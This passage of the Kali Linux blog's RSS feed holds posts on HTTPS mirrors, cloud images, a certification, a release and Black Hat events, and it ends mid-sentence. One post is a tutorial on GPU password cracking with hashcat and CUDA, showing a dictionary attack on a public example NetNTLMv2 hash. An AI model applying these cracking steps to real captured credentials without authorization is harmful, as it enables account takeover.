<description><p>A couple of weeks back we added more HTTPS support to our Kali infrastructure, and wanted to give our users some guidance and point out what&rsquo;s new. While our <a href="https://www.kali.org/get-kali/">Kali Linux download page</a> (and shasums) has always been served via HTTPS, our mirror redirector has not. Now that we generate weekly images, secure access to the mirror redirector has become crucial.</p> <h3 id="httpscdimagekaliorg"><a href="https://cdimage.kali.org">https://cdimage.kali.org</a></h3> <p>This is our Kali Image Mirror Redirector. This server accepts your download requests from our <a href="https://www.kali.org/get-kali/">official download page</a>, and then serves your requested file from the geographically closest mirror. This is also the download point for our <a href="https://cdimage.kali.org/kali-weekly/">Kali Weekly builds</a> - now with fresh and shiny HTTPS support. Hitting this redirector via HTTPS will redirect your request to an SSL enabled download server, while an unencrypted HTTP request will redirect to an HTTP enabled mirror. Where&rsquo;s the catch? Not all donated mirrors support HTTPS, so choosing this transport may result in slower download speeds. Should downloading a Kali image over HTTP be a security concern? Not if you <a href="https://www.kali.org/docs/introduction/download-official-kali-linux-images/">GPG verify your downloaded image</a>.</p> <h3 id="httpshttpkaliorg"><a href="https://http.kali.org">https://http.kali.org</a></h3> <p>As a byproduct of enabling HTTPS on cdimage.kali.org, we now also support <strong>apt</strong> HTTPS transports. This means that our actual Kali package repositories can support HTTPS - resulting in encrypted Kali updates and upgrades. Surprisingly, this does not add much security to the update / upgrade process (read <a href="https://askubuntu.com/questions/146108/how-to-use-https-with-apt-get">here</a> if you&rsquo;re wondering why) - however it *does* add an extra layer of security, so we figured, &ldquo;why not?&rdquo;. To enable the <strong>apt</strong> HTTPS transport, first make sure the <strong>apt-transport-https</strong> package is installed (it&rsquo;s installed by default in our weekly images and upcoming releases) and enable the HTTPS transport in your sources.list file as shown below:</p> <pre><code class="language-console">root@kali:~# apt install apt-transport-https root@kali:~# cat /etc/apt/sources.list deb https://http.kali.org/kali kali-rolling main contrib non-free # deb-src https://http.kali.org/kali kali-rolling main contrib non-free root@kali:~# </code></pre> <p>Now any update or upgrade operation preformed against our mirrors will be HTTPS enabled:</p> <pre><code class="language-console">root@kali:~# apt update Hit:1 https://archive-3.kali.org/kali kali-rolling InRelease Reading package lists... Done root@kali:~# </code></pre> <p>As not all donated mirrors come with HTTPS support, shifting to the HTTPS transport may result in a less optimized mirror being selected for you, resulting in slower download speeds. As moving to an apt HTTPS transport <a href="https://askubuntu.com/questions/146108/how-to-use-https-with-apt-get">does not provide much extra security</a>, do so only if you feel you must!</p></description>
</item>
<item>
<title>Cracking in the Cloud with CUDA GPUs</title>
<link>https://www.kali.org/blog/cloud-cracking-with-cuda-gpu/</link>
<guid isPermaLink="true">https://www.kali.org/blog/cloud-cracking-with-cuda-gpu/</guid>
<pubDate>Tue, 28 Feb 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/cloud-cracking-with-cuda-gpu/images/kali-cuda-cracking-cloud.jpg" type="image/jpg"/>
<description><p>Due to increasing popularity of cloud-based instances for password cracking, we decided to focus our efforts into streamlining Kali&rsquo;s approach. We&rsquo;ve noticed that Amazon&rsquo;s AWS <a href="https://aws.amazon.com/ec2/instance-types/p2/">P2-Series</a> and Microsoft&rsquo;s Azure <a href="https://azure.microsoft.com/en-us/blog/azure-n-series-general-availability-on-december-1/">NC-Series</a> are focused on Windows and Ubuntu. The corresponding blog posts and guides followed suit. Although these instances are limited by the NVIDIA Tesla K80&rsquo;s hardware capabilities, the ability to quickly deploy a Kali instance with CUDA support is appealing.</p> <p>Installing proprietary graphics drivers has always been a source of frustration; fortunately, improvements in packaging have made this process much more seamless. Although we&rsquo;ve done the work for you in the cloud offerings, we&rsquo;d like to help simplify installation for your own use.</p> <h3 id="prerequisites">Prerequisites</h3> <p>First, you&rsquo;ll need to ensure that your system is fully upgraded and that your card supports <a href="https://developer.nvidia.com/cuda-gpus">CUDA</a>. <strong>Note:</strong> GPUs with a <a href="https://developer.nvidia.com/cuda-gpus">CUDA compute capability</a> &gt; 5.0 are recommended, but GPUs with less will still work:</p> <pre><code class="language-sh">apt-get update &amp;&amp; apt-get dist-upgrade -y </code></pre> <p>Once we&rsquo;ve updated the system, we need to check for the <strong>nouveau kernel modules</strong>, and if enabled, blacklist them:</p> <pre><code class="language-console">root@kali:~# lsmod |grep -i nouveau nouveau 1499136 1 mxm_wmi 16384 1 nouveau wmi 16384 2 mxm_wmi,nouveau video 40960 1 nouveau root@kali:~# root@kali:~# echo -e &quot;blacklist nouveau\noptions nouveau modeset=0\nalias nouveau off&quot; &gt; /etc/modprobe.d/blacklist-nouveau.conf </code></pre> <p>After modifying kernel parameters, we&rsquo;ll need to update our <strong>initramfs</strong>, then reboot:</p> <pre><code class="language-sh">update-initramfs -u &amp;&amp; reboot </code></pre> <h3 id="installation-on-a-local-computer">Installation on a Local Computer</h3> <p>Once we have rebooted and have determined that the nouveau modules have not loaded, we will proceed to install the <strong>OpenCL ICD Loader</strong>, <strong>Drivers</strong>, and the <strong>CUDA toolkit</strong>:</p> <pre><code class="language-sh">apt-get install -y ocl-icd-libopencl1 nvidia-driver nvidia-cuda-toolkit </code></pre> <p>During installation of the drivers the system created new kernel modules, so another reboot is required.</p> <h3 id="verify-driver-installation">Verify Driver Installation</h3> <p>Now that our system should be ready to go, we need to verify the drivers have been loaded correctly. We can quickly verify this by running the <a href="https://developer.nvidia.com/nvidia-system-management-interface">nvidia-smi</a> tool:</p> <pre><code class="language-console">root@kali:~# nvidia-smi +-----------------------------------------------------------------------------+ | NVIDIA-SMI 375.26 Driver Version: 375.26 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 Tesla K80 Off | 0000:00:1E.0 Off | 0 | | N/A 28C P0 53W / 149W | 0MiB / 11439MiB | 65% Default | +-------------------------------+----------------------+----------------------+ </code></pre> <p>With the output displaying our driver and GPU correctly, we can now dive into password cracking. Before we get too far ahead, let&rsquo;s double check to make sure hashcat and CUDA are working together:</p> <pre><code class="language-console">root@kali:~# hashcat -I OpenCL Info: Platform ID #1 Vendor : NVIDIA Corporation Name : NVIDIA CUDA Version : OpenCL 1.2 CUDA 8.0.0 Device ID #1 Type : GPU Vendor ID : 32 Vendor : NVIDIA Corporation Name : Tesla K80 Version : OpenCL 1.2 CUDA Processor(s) : 13 Clock : 823 Memory : 2047/11439 MB allocatable OpenCL Version : OpenCL C 1.2 Driver Version : 375.26 </code></pre> <p><strong>Note:</strong> If you receive the error c_lGetDeviceIDs(): CL_DEVICE_NOT_FOUND_ with Platform ID labeled <em>Vendor: Mesa</em> run:</p> <pre><code class="language-sh">apt-get remove mesa-opencl-icd </code></pre> <p>It appears everything is working, let&rsquo;s go ahead and run a benchmark test.</p> <h3 id="benchmarking">Benchmarking</h3> <pre><code class="language-console">root@kali:~# hashcat -b OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: Tesla K80, 2047/11439 MB allocatable, 13MCU Hashtype: MD5 Speed.Dev.#1.....: 4247.2 MH/s (102.66ms) Hashtype: SHA1 Speed.Dev.#1.....: 1850.5 MH/s (58.64ms) Hashtype: SHA256 Speed.Dev.#1.....: 785.1 MH/s (69.41ms) </code></pre> <h3 id="cracking">Cracking</h3> <p>Now let&rsquo;s crack some hashes. We are going to use the example NetNTLMv2 hash found on the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat wiki.</a></p> <pre><code class="language-console">root@kali:~# hashcat -a 0 -m 5600 ntlmv2.hash dict.txt OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: Tesla K80, 2047/11439 MB allocatable, 13MCU ADMIN::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030:hashcat Session..........: hashcat Status...........: Cracked Hash.Type........: NetNTLMv2 Hash.Target......: ADMIN::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 Input.Base.......: File (dict.txt) Input.Queue......: 1/1 (100.00%) Speed.Dev.#1.....: 0 H/s (0.10ms) Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 101/101 (100.00%) </code></pre> <p><strong>Success!</strong> We&rsquo;ve cracked the example hash and proven our installation is functional. There are a multitude of configurations to improve cracking speed, not mentioned in this guide. However, we encourage you to take a look at the <a href="https://hashcat.net/wiki/">hashcat documentation</a> for your specific cases.</p> <h3 id="running-a-gpu-instance-in-aws">Running a GPU Instance in AWS</h3> <p>We&rsquo;ve registered new CUDA enabled <a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">Kali Rolling images with Amazon</a> which work out of the box with P2 AWS images. With virtually no additional setup required, you can get up and running with a Kali GPU instance in less than 30 seconds. All you need to do is choose a P2 instance, and you&rsquo;re ready to start cracking!</p></description>
</item>
<item>
<title>The Kali Linux Certified Professional</title>
<link>https://www.kali.org/blog/introducing-kali-linux-certified-professional/</link>
<guid isPermaLink="true">https://www.kali.org/blog/introducing-kali-linux-certified-professional/</guid>
<pubDate>Tue, 17 Jan 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/introducing-kali-linux-certified-professional/images/kali-certified-professional-4-1.jpg" type="image/jpg"/>
<description><h2 id="introducing-the-klcp-certification">Introducing the KLCP Certification</h2> <p>After almost two years in the making, it is with great pride that we announce today our new <strong>Kali Linux Professional certification</strong> - the first and only official certification program that validates one&rsquo;s proficiency with the Kali Linux distribution.</p> <p>If you&rsquo;re new to the information security field, or are looking to take your first steps towards a new career in InfoSec, the KLCP is a &ldquo;must have&rdquo; foundational certification. Built on the philosophy that &ldquo;you&rsquo;ve got to walk before you can run,&rdquo; the KLCP will give you direct experience with your working environment and a solid foundation toward a future with any professional InfoSec work. As we continually see, those entering the OffSec <a href="https://www.offsec.com/pwk-oscp/">PWK</a> program with previous working experience with Kali, and a general familiarity with Linux, tend to do better in the real world <a href="https://www.offsec.com/pwk-oscp/">OSCP</a> exam.</p> <p>For those of you who already have some experience in the field, the KLCP provides a solid and thorough study of the Kali Linux Distribution - learning how to build custom packages, host repositories, manage and orchestrate multiple instances, build custom ISOs, and much, much, more. The KLCP will allow you to take that ambiguous bullet point at the end of your resume - the one that reads &ldquo;Additional Skills - familiarity with Kali Linux&rdquo;, and properly quantify it. <strong>Possession of the KLCP certification means that you have truly mastered the Kali penetration testing distribution and are ready to take your information security skills to the next level</strong>.</p> <p>The KLCP exam will be available via <a href="https://home.pearsonvue.com/">Pearson VUE</a> exam centres worldwide after the <a href="https://www.blackhat.com/">Black Hat</a> USA 2017 event in Las Vegas.</p> <h2 id="new-book---kali-linux-revealed">New Book - Kali Linux Revealed</h2> <h3 id="mastering-the-penetration-testing-distribution">Mastering the Penetration Testing Distribution</h3> <p>More exciting news! In the past year, we&rsquo;ve been working internally on an Official Kali Linux book - <strong><em>Kali Linux Revealed: Mastering the Penetration Testing Distribution</em></strong>. This is the first official Kali book from OffSec Press, and is scheduled for release on July 22nd, 2017. <em>Kali Linux Revealed</em> will be available in both hard copy and online formats. Keeping the Kali Linux spirit, the online version of the book will be free of charge, allowing anyone who wishes to hone their skills and improve their knowledge of Kali to do so at no cost. This book, together with our official Kali documentation site will encompass the body of knowledge for the KLCP.</p> <p><p> <a href='https://www.kali.org/blog/introducing-kali-linux-certified-professional/images/kali-revealed-book-cover.png'> <img src="https://www.kali.org/blog/introducing-kali-linux-certified-professional/images/kali-revealed-book-cover.png" alt="" /> </a> </p> </p> <h2 id="kali-linux-revealed-class-at-black-hat-usa-2017">&ldquo;Kali Linux Revealed&rdquo; Class at Black Hat USA, 2017</h2> <p>This year, we are fortunate enough to debut our <a href="https://www.blackhat.com/us-17/training/index.html">first official Kali Linux training</a> at the <strong>Black Hat</strong> conference in Las Vegas, 2017. This in depth, four day course will focus on the Kali Linux platform itself (as opposed to the tools, or penetration testing techniques), and help you understand and maximize the usage of Kali from the ground up. Delivered by <a href="https://www.kali.org/about-us/">Mati Aharoni</a> and Johnny Long, in this four day class you will learn how to:</p> <ul> <li>Gain confidence in basic Linux proficiency, fundamentals, and the command line.</li> <li>Install and verify Kali Linux as a primary OS or virtual machine, including full disk encryption and preseeding.</li> <li>Use Kali as a portable USB distribution including options for encryption, persistence, and &ldquo;self-destruction&rdquo;.</li> <li>Install, remove, customize, and troubleshoot software via the Debian package manager.</li> <li>Thoroughly administer, customize, and configure Kali Linux for a streamlined experience.</li> <li>Troubleshoot Kali and diagnose common problems in an optimal way.</li> <li>Secure and monitor Kali at the network and filesystem levels.</li> <li>Create your own packages and host your own custom package repositories.</li> <li>Roll your own completely customized Kali implementation and preseed your installations.</li> <li>Customize, optimize, and build your own kernel.</li> <li>Scale and deploy Kali Linux in the enterprise.</li> <li>Manage and orchestrate multiple installations of Kali Linux.</li> </ul> <p><strong>Please Note: This is not a penetration testing course.</strong> This course is focused on teaching the student how to get the most out of the Kali Linux Penetration Testing Platform, not how to use the packaged tools in an offensive manner. Attending students will receive a signed copy of the &ldquo;Kali Linux Revealed&rdquo; book as well as a free voucher to sit the KLCP exam in a nearby <a href="https://home.pearsonvue.com/">Pearson VUE</a> certification centre.</p> <p>A lot has been going on behind the scenes in the Kali Linux arena, and we&rsquo;re excited to see our distribution get a free and formal education path. We believe this will improve the skills of those using Kali Linux and better the community and information security industry as a whole. We are putting all our efforts into finishing up the Kali Revealed book, and will keep y&rsquo;all updated as the release date nears. In the meantime, follow us on <a href="https://twitter.com/kalilinux">twitter</a> to get realtime updates as they come out.</p></description>
</item>
<item>
<title>Kali Linux in the AWS cloud, again</title>
<link>https://www.kali.org/blog/kali-linux-aws-cloud/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-aws-cloud/</guid>
<pubDate>Fri, 02 Dec 2016 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-aws-cloud/images/kali-amazon-aws-2.jpg" type="image/jpg"/>
<description><p>We&rsquo;re happy to announce that we&rsquo;ve once again listed our <a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">Kali Linux images on the Amazon AWS</a> marketplace. You can now spin up an updated Kali machine easily through your EC2 panel. Our current image is a &ldquo;full&rdquo; image, which contains all the standard tools available in a full Kali release. Once your instance is running, connect to it with your SSH private key using the &ldquo;<strong>ec2-user</strong>&rdquo; account. Don&rsquo;t forget to update your Kali instance to get the latest packages and bug fixes. Type as root (or sudo): <strong>apt update &amp;&amp; apt dist-upgrade</strong>. We are &ldquo;selling&rdquo; these images on the marketplace for <strong>free</strong>, so other than the regular Amazon charges, there are no extras to pay. The Kali team would like to take this opportunity to thank <strong>@r0kh</strong> for his efforts of getting Kali back on track (no pun intended) and working flawlessly in AWS. If you plan to use these Kali images for penetration testing in an AWS environment, make sure you check out the Amazon penetration testing <a href="https://aws.amazon.com/security/penetration-testing/">request form</a>.</p> <p><a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">Kali Rolling on AWS</a></p></description>
</item>
<item>
<title>Azure Marketplace, Weekly ISO Builds</title>
<link>https://www.kali.org/blog/azure-marketplace-weekly-iso-builds/</link>
<guid isPermaLink="true">https://www.kali.org/blog/azure-marketplace-weekly-iso-builds/</guid>
<pubDate>Tue, 13 Sep 2016 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/azure-marketplace-weekly-iso-builds/images/kali-msft-azure-marketplace.jpg" type="image/jpg"/>
<description><h2 id="kali-linux-in-the-azure-marketplace">Kali Linux in the Azure Marketplace</h2> <p>Over the past couple of weeks we&rsquo;ve been working on building and implementing Kali 2016.2 in the <strong>Azure Marketplace</strong>. We&rsquo;re happy to announce that from today on, you can <a href="https://azure.microsoft.com/en-us/marketplace/partners/kali-linux/kali-linux/">spin up a Kali machine</a> from the Azure Marketplace. In just a few seconds, you can have a full <strong>penetration testing toolset</strong> at your fingertips for no additional cost (other than the standard Azure pricing). If you are a new Azure customer, you can create a free account and receive <a href="https://azure.microsoft.com/en-us/offers/ms-azr-0044p/">$200 credit</a>. If you are performing penetration testing, please refer to the <a href="https://security-forms.azure.com/penetration-testing/terms">Azure Testing Request</a> for more information.</p> <p><p> <a href='https://www.kali.org/blog/azure-marketplace-weekly-iso-builds/images/kalisummary.png'> <img src="https://www.kali.org/blog/azure-marketplace-weekly-iso-builds/images/kalisummary.png" alt="" /> </a> </p> </p> <h2 id="kali-linux-weekly-iso-builds">Kali Linux Weekly ISO Builds</h2> <p>As we mentioned in our Kali Rolling 2016.2 release, we&rsquo;ve started building weekly images of our Kali ISOs. This allows people access to &ldquo;fresher&rdquo; and more up-to-date Kali builds at any given time, and helps cut back on the long waits for updates. The ISOs will be generated each <strong>Sunday</strong> and will be versioned as &ldquo;<strong>-W</strong>&rdquo;. Once all builds are generated, they will be available via <a href="http://cdimage.kali.org/kali-images/kali-weekly/">cdimage.kali.org/kali-images/kali-weekly</a>. Each weekly release will have it&rsquo;s own SHA1SUM file which will be available at <a href="https://archive.kali.org/kali-images/kali-weekly/SHA1SUMS">archive.kali.org/kali-images/kali-weekly/SHA1SUMS</a>.</p> <h2 id="mr-robot-ekoparty-and-release-aftermath">Mr Robot, Ekoparty, and Release Aftermath</h2> <p>We are overjoyed with the <strong>positive feedback</strong> we have received from the 2016.2 update and our download servers have been squealing, serving well over 290,000 copies of Kali this month. We very much appreciate the kind words and as always, would recommend that if you happen to come across any problems - make sure to report them to us through our <a href="https://bugs.kali.org/">bug tracker</a>.</p> <p>Additionally, we have had the pleasure of watching Kali make an appearance on <a href="https://www.usanetwork.com/mr-robot">Mr Robot</a> multiple times! We have always been impressed with how grounded the technology is on that show, and seeing Kali leveraged in realistic manners is always fun. Finally, we wanted to make one last shout out about the upcoming Kali Dojo at <a href="https://ekoparty.org/kali-workshops.php">ekoparty</a>. If you are attending, be sure to drop in and say hello!</p></description>
</item>
<item>
<title>Kali Linux 2016.2 Release</title>
<link>https://www.kali.org/blog/kali-linux-2016-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2016-2-release/</guid>
<pubDate>Wed, 31 Aug 2016 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2016-2-release/images/kali-rolling-2016-2-release3.jpg" type="image/jpg"/>
<description><p>We&rsquo;re well recovered from the Black Hat and DEF CON Vegas conferences and as promised, we&rsquo;re launching our second Kali Rolling ISO release aka <strong>Kali 2016.2</strong>. This release brings a whole bunch of interesting news and updates into the world of Kali and we&rsquo;re <strong>excited</strong> to tell you all about it.</p> <h2 id="new-kde-mate-lxde-e17-and-xfce-builds">New KDE, MATE, LXDE, e17, and Xfce Builds</h2> <p>Although users are able to build and customize their Kali Linux ISOs however they wish, we often hear people comment about how they would love to see Kali with $desktop_environment instead of GNOME. We then engage with those people passionately, about how they can use live-build to customize not only their desktop environment but pretty much <strong>every aspect of their ISO</strong>, together with the ability to run scripted hooks at every stage of the ISO creation process - but more often than not, our argument is quickly lost in random conversation. As such, we&rsquo;ve decided to expand our &ldquo;full&rdquo; 64bit releases with additional Desktop Environment flavored ISOs, specifically <strong>KDE, Mate, LXDE and Enlightenment</strong>. These can now be downloaded via our <a href="https://www.kali.org/get-kali/">Kali Download page</a>. For those curious to see what the various Desktop Environments look like, we&rsquo;ve taken some screenshots for you:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/gnome.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/gnome.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/lxde.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/lxde.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/mate.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/mate.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/xfce.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/xfce.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/e17.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/e17.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/kde.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/kde.png" alt="" /> </a> </p> </p> <h2 id="kali-linux-weekly-isos">Kali Linux Weekly ISOs</h2> <p>Constantly keeping Kali on the bleeding edge means frequent updates to packages on an ongoing basis. Since our last release several months ago, there&rsquo;s a few hundred new or updated packages which have been pushed to the Kali repos. This means that anyone downloading an ISO even 3 months old has somewhat of a long &ldquo;apt-get dist-upgrade&rdquo; ahead of them. To help avoid this situation, from this release onwards, we&rsquo;ll be publishing updated weekly builds of Kali that will be available to download via our mirrors. Speaking of mirrors, we are always in need of support in this area - <strong>if you&rsquo;re capable of running a high-bandwidth mirror and would like to support our project, please check out our <a href="https://www.kali.org/docs/community/kali-linux-mirrors/">Kali Mirrors</a> page</strong>.</p> <h2 id="bug-fixes-and-os-improvements">Bug Fixes and OS Improvements</h2> <p>During these past few months, we&rsquo;ve been busy adding new relevant tools to Kali as well as fixing various bugs and implementing OS enhancements. For example, something as simple as adding HTTPS support in <strong>busybox</strong> now allows us to preseed Kali installations securely over SSL. This is a quick and cool feature to speed up your installations and make them (almost) unattended, even if you don&rsquo;t have a custom built ISO.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2016-2-release/images/preseed-https.png'> <img src="https://www.kali.org/blog/kali-linux-2016-2-release/images/preseed-https.png" alt="" /> </a> </p> </p> <pre><code class="language-console">preseed/url=http://www.kali.org/dojo/preseed.cfg </code></pre> <h2 id="kali-sana-repositories-retired">Kali &ldquo;sana&rdquo; Repositories Retired</h2> <p>We announced the &ldquo;sana&rdquo; release EOL a few months ago along with its public repositories. We&rsquo;ve given a few months grace and are now finally purging the &ldquo;sana&rdquo; repositories from our servers. For anyone who still needs them, they can be found archived at old.kali.org.</p> <h2 id="exciting-news-coming-up">Exciting News Coming Up!</h2> <p>We are really excited about these changes to Kali as we continue to improve and expand the best Linux-based penetration testing framework around. Beyond these distribution changes, there have been a number of other project-related events such as the multitude of times that Kali has been <a href="https://sendvid.com/s0etudtt">featured</a> on the hit USA network series <a href="https://www.usanetwork.com/mr-robot">Mr Robot</a> and the Official <a href="https://twitter.com/kalilinux">Kali Linux Twitter</a> account becoming a verified account.</p> <p>We have a lot of exciting announcements that will be coming in the next few weeks, so if you are not already following us on Twitter, be sure to do so! If you are attending the <strong>ekoparty conference</strong> we will be there doing the <a href="https://ekoparty.org/kali-workshops.php">Kali Dojo</a>, so be sure to drop by and say hello. And as always, if you find any issues in this new release of Kali, be sure to report it on our <a href="https://bugs.kali.org/my_view_page.php">bug tracker</a>.</p></description>
</item>
<item>
<title>Hacking with Kali at Black Hat USA 2016</title>
<link>https://www.kali.org/blog/hacking-kali-black-hat/</link>
<guid isPermaLink="true">https://www.kali.org/blog/hacking-kali-black-hat/</guid>
<pubDate>Wed, 20 Jul 2016 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/hacking-kali-black-hat/images/kali-playground-blackhat-2016-v2.jpg" type="image/jpg"/>
<description><h2 id="kali-linux-dojo-blackhat-2016---las-vegas">Kali Linux Dojo, BlackHat 2016 - Las Vegas</h2> <p>We have really enjoyed doing the <a href="https://www.blackhat.com/us-16/kali-linux.html"><strong>Dojo at Black Hat</strong></a> the last few years. It&rsquo;s been a great opportunity to show off some of the lesser known (but oh so useful) <a href="https://www.kali.org/features/">features of Kali Linux</a> as well as interact with the user base. But one of the limitations of the previous structure was that while this was a hands-on exercise, many attendees moved at different paces from each other. So we wanted to move towards more of a &ldquo;self service&rdquo; model where <strong>attendees can drop in, have access to the training material, and will be free to work at their own pace</strong>. We accomplished with the new model we will be premiering this year, allowing everyone to take as much, or as little, time needed to get a working Kali install customized to their desires. While this is being done, <strong>Kali developers will be onsite and interacting with everyone</strong> on a consistent basis.</p> <h2 id="hacking-the-playground-with-kali-linux">Hacking the playground with Kali Linux</h2> <p>This leads to the next major change in structure, as in previous years a commonly heard question was &ldquo;Great! I have this beautiful Kali install, now what do I do with it?&rdquo;. This year, we have a great answer for this: <strong>Hack our systems</strong>!</p> <p>Our good friends at <a href="https://www.offsec.com/">OffSec</a> have been gracious enough to provide us with a number of systems that have been preconfigured with interesting and unique vulnerabilities. This environment will will be setup in the room, and attendees can connect into it and put Kali Linux to use, hacking these systems to your hearts content. Whats more, we will be providing some extra incentive for you to <strong>hack all the things</strong>, by giving away <strong>prizes</strong> to those that obtain the highest score.</p> <h2 id="our-cool-giveaways-in-the-playground-ctf">Our cool giveaways in the Playground CTF</h2> <p>Here are a few pics of the Kali hardware we&rsquo;ll be giving away to our contest winners in the Kali Dojo CTF:</p> <p><p> <a href='https://www.kali.org/blog/hacking-kali-black-hat/images/kali-xfce4-flipbook-open-trans.png'> <img src="https://www.kali.org/blog/hacking-kali-black-hat/images/kali-xfce4-flipbook-open-trans.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/hacking-kali-black-hat/images/kali-go-trans.png'> <img src="https://www.kali.org/blog/hacking-kali-black-hat/images/kali-go-trans.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/hacking-kali-black-hat/images/kali-wifi-usb-kit-trans.png'> <img src="https://www.kali.org/blog/hacking-kali-black-hat/images/kali-wifi-usb-kit-trans.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/hacking-kali-black-hat/images/kali-nfc-trans.png'> <img src="https://www.kali.org/blog/hacking-kali-black-hat/images/kali-nfc-trans.png" alt="" /> </a> </p> </p> <h2 id="what-to-bring-if-you-want-to-attend">What to bring if you want to attend:</h2> <p>Now that we have your attention, here&rsquo;s what you need to bring!</p> <ul> <li>Powerful 64bit laptop with Kali Rolling (!) installed in a VM or natively.</li> <li>At least 40 GB free space in the VM or laptop for generating ISOs</li> <li>8GB USB 3.0 stick (or larger) for creating Kali Live USBs.</li> </ul> <p>We will have Kali VMWare images for you to download on site - so if you choose this option, make sure you have the latest VMware Workstation of Fusion installed. Yes, make sure it&rsquo;s the LATEST version!</p> <h2 id="come-say-hello">Come say hello!</h2> <p>Thats right. You can get a <strong>pre-release version of Kali Linux</strong> before its available to the public, you can <strong>customize it to yours hearts content</strong>. And then you can use it to <strong>hack vulnerable machines</strong> to accumulate points. And we will give you free stuff for doing all this. We know there is a lot going on at Black Hat Vegas, as the convention gets better every year. We do hope that you budget some time to drop on the Kali Dojo on <strong>Aug. 4th</strong>, as we will be going all day.</p></description>
</item>
<item>
<title>Kali Linux Dojo at Black Hat Vegas 2016</title>
<link>https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/</guid>
<pubDate>Mon, 11 Jul 2016 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/kali-dojo-2016-blackhat.jpg" type="image/jpg"/>
<description><p>The folks at <strong>Black Hat</strong> have been kind enough to invite us once again to deliver a <a href="https://www.blackhat.com/us-16/kali-linux.html">Kali Dojo in Las Vegas</a> this year. The event will be held on the <strong>4th of August at the Mandalay Bay</strong> hotel, and will be open to all Black Hat pass types. This year our Dojo will be set up differently, allowing for a larger crowd and much more interaction. We are going to hold a full day event, featuring several main activity areas :</p> <p><p> <a href='https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/dojo-slider.png'> <img src="https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/dojo-slider.png" alt="" /> </a> </p> </p> <h2 id="area-1-customising-kali-isos-using-live-build">Area 1: Customising Kali ISOs using live-build</h2> <p>One to the most important aspects of Kali Linux is it ability to be customized based on your unique and specific needs. <strong>Define your toolsets,</strong> your desktop environment, customised scripts and wallpapers - and of course, <strong>preseed your installation</strong> media as needed. This area of the Dojo will feature the ever popular custom ISO generation on Kali Rolling.</p> <p><p> <a href='https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/kali-iso-special-features.png'> <img src="https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/kali-iso-special-features.png" alt="" /> </a> </p> </p> <h2 id="area-2-kali-live-usb-with-persistence-and-luks">Area 2: Kali Live USB with Persistence and LUKS</h2> <p>USB speeds keep getting faster and faster, to the point now where they are viable storage for a secondary system. In this area we will help you understand how to deploy your customized Kali ISO to a <strong>secure, encrypted, USB install</strong>. Complete with Kali specific features such as <strong>multiple persistent stores and LUKS Nuke</strong>!</p> <p><p> <a href='https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/kali-usb.png'> <img src="https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/kali-usb.png" alt="" /> </a> </p> </p> <h2 id="area-3-hacking-with-kali-linux---test-the-tools">Area 3: Hacking with Kali Linux - Test the tools</h2> <p>Now that you have tweaked out and customized Kali install, what do you do with it? <strong>Hack stuff</strong>! In this area we will provide you with a safe and secure area to put Kali to use, with <strong>real world attack 